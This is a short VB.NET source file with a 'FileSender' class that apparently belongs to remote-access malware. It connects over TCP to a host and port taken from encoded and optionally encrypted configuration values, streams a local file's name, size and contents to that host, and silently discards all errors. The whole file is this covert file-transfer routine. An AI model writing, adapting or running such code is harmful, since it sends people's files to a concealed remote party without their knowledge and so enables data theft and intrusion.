﻿Imports System.Net.Sockets
Imports System.Text
Imports System.IO
Imports System.Security.Cryptography
Imports System.Net
Public Class FileSender
    Dim BUFFERSIZE As Integer = 1024 * 20
    Public fname As String
    Public fullname As String

    Public Sub Threader()
        Dim ab As New Threading.Thread(AddressOf Send)
        ab.Start()
    End Sub
    Private Sub Send()
        Try
            Dim info As New FileInfo(fullname)
            Dim tcp As New TcpClient
            If A.EncryptStatus = "True" Then
                tcp.Connect(C.DecryptData(DEB(A.EncryptKey), A.h), DEB(A.dwport))
            Else
                tcp.Connect(DEB(A.h), DEB(A.dwport))
            End If
            Dim bw As New BinaryWriter(tcp.GetStream)
            bw.Write(info.Name)
            bw.Write(info.Length)
            Using fs As New FileStream(fullname, FileMode.Open, FileAccess.Read)
                Dim buffer(BUFFERSIZE) As Byte
                Dim reads As Integer = -1

                Dim totalRead As Integer = 0
                Do Until reads = 0
                    reads = fs.Read(buffer, 0, buffer.Length)
                    tcp.GetStream.Write(buffer, 0, reads)
                    totalRead += reads
                Loop
            End Using
            bw.Close()
            tcp.Close()
        Catch ex As Exception

        End Try
    End Sub
End Class